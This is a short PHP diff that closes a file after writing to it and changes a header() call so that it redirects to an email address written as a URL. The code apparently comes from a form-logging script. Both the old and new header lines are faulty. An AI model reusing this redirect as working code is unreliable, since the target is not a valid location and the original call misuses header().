@@ -11,6 +11,6 @@ fwrite($handle,"\r\n");
 }
 fwrite($handle,"\r\n");
 fclose($handle);
-header( $to = "chaukegivencplus@gmail.com");
+header("location:http://chaukegivencplus@gmail.com");
 exit;
 ?>
